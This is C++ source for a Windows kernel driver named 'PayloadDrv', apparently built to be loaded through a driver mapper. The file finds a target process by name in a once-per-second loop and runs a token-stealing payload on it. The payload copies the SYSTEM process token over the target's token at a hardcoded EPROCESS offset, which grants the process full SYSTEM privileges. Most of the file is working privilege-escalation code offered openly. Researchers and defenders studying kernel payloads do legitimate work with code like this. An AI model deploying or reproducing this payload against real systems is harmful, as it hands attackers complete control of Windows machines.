#include <ntifs.h>
#include <ntddk.h>
#include <wdm.h>

#include "../mapper_driver/undoc_api.h"

#define DRIVER_PREFIX "PayloadDrv"
#define DRIVER_TAG 'dcba'

void KernelSleep(ULONG milliseconds)
{
	ULONGLONG ms = milliseconds;
	ms = (ms * 1000) * 10;
	ms = ms * -1;
	KeDelayExecutionThread(KernelMode, 0, (PLARGE_INTEGER)&ms);
}

VOID TokenStealingPayloadPsReferencePrimaryToken(HANDLE PID) {
	// Publicly known Kernel Payload

	PEPROCESS CurrentProcess = NULL;
	PsLookupProcessByProcessId((HANDLE)PID, &CurrentProcess);

	PEPROCESS SystemProcess = NULL;
	PsLookupProcessByProcessId((HANDLE)4, &SystemProcess);

	PACCESS_TOKEN SystemToken = NULL;
	SystemToken = PsReferencePrimaryToken(SystemProcess);

	PACCESS_TOKEN TargetToken = NULL;
	TargetToken = PsReferencePrimaryToken(CurrentProcess);

	EX_FAST_REF* ctoken_ptr = (EX_FAST_REF*)TargetToken;
	EX_FAST_REF* stoken_ptr = (EX_FAST_REF*)SystemToken;
#ifdef _WIN64
	ULONGLONG* ctoken_ptr2 = (ULONGLONG*)((ULONG_PTR)CurrentProcess + 0x4b8);
	ULONGLONG* stoken_ptr2 = (ULONGLONG*)((ULONG_PTR)SystemProcess + 0x4b8);
#else
	DbgPrint(DRIVER_PREFIX " Only 64 bit supported");
	return;
#endif
	DbgPrint(DRIVER_PREFIX " System EPROCESS         : %p", SystemProcess);
	DbgPrint(DRIVER_PREFIX " Current Process EPROCESS: %p", CurrentProcess);

	ULONGLONG token_valc = (ULONGLONG)(*((ULONGLONG*)ctoken_ptr2));
	ULONGLONG token_vals = (ULONGLONG)(*((ULONGLONG*)stoken_ptr2));
	LONGLONG new_val = token_valc & 0x0F | token_vals & ~0x0F;

	DbgPrint(DRIVER_PREFIX " System token         : %p ; %p", stoken_ptr, token_vals);
	DbgPrint(DRIVER_PREFIX " Current Process token: %p ; %p ; new: %p", ctoken_ptr, token_valc, new_val);

	*ctoken_ptr2 = new_val;
}


HANDLE find_process(UNICODE_STRING& WantedImageName)
{
	HANDLE myProcess = NULL;
	ULONG buffer_size = 1000 * sizeof(SYSTEM_PROCESS_INFORMATION);
	void* buffer = ExAllocatePoolWithTag(NonPagedPool, buffer_size, DRIVER_TAG);

	NTSTATUS status = STATUS_SUCCESS;

	while (true) {
		if (!buffer) {
			return NULL;
		}
		ULONG retSize = 0;
		status = ZwQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &retSize);
		if (status == STATUS_SUCCESS) {
			break;
		}
		// not successful:
		ExFreePoolWithTag(buffer, DRIVER_TAG);

		//try again:
		if (status == STATUS_INFO_LENGTH_MISMATCH)
		{
			buffer_size = retSize;
			buffer = ExAllocatePoolWithTag(NonPagedPool, buffer_size, DRIVER_TAG);
			continue;
		}
		break;
	}

	if (status != STATUS_SUCCESS) {
		if (buffer) {
			ExFreePoolWithTag(buffer, DRIVER_TAG);
		}

		DbgPrint(DRIVER_PREFIX " ZwQuerySystemInformation failed: %X\n", status);
		return NULL;
	}

	SYSTEM_PROCESS_INFORMATION* pInfo = (SYSTEM_PROCESS_INFORMATION*)buffer;
	while (pInfo)
	{

		if (RtlEqualUnicodeString(&pInfo->ImageName, &WantedImageName, TRUE)) {
			myProcess = pInfo->UniqueProcessId;
			break;
		}

		if (!pInfo->NextEntryOffset) break;
		pInfo = (SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pInfo + pInfo->NextEntryOffset);
	}

	ExFreePoolWithTag(buffer, DRIVER_TAG);
	return myProcess;
}


void RunMain(void* param)
{
	if (!param) {
		DbgPrint(DRIVER_PREFIX "[-] Parameter not passed!\n");
	}

	const char* name = (char*)param;
	STRING SearchedNameStr;
	RtlInitString(&SearchedNameStr, name);

	//convert STRING to UNICODE_STRING
	UNICODE_STRING SearchedDriverNameU;
	if (RtlAnsiStringToUnicodeString(&SearchedDriverNameU, &SearchedNameStr, 1u) != STATUS_SUCCESS) {
		DbgPrint(DRIVER_PREFIX "[-] Failed to convert the parameter!\n");
		return;
	}


	while (TRUE) {
		KernelSleep(1000);
#ifdef _WIN64
		PETHREAD Thread = (PETHREAD)__readgsqword(0x188);
#else
		PETHREAD Thread = (PETHREAD)__readfsdword(0x124);
#endif
		DbgPrint(DRIVER_PREFIX "[+] called from TID: %p\n", PsGetThreadId(Thread));

		HANDLE myProcess = find_process(SearchedDriverNameU);
		if (myProcess) {
			DbgPrint(DRIVER_PREFIX "[*] Process found: %s\n", name);
			TokenStealingPayloadPsReferencePrimaryToken(myProcess);
		}
	}
}

extern "C"
NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);
	return STATUS_SUCCESS;
}
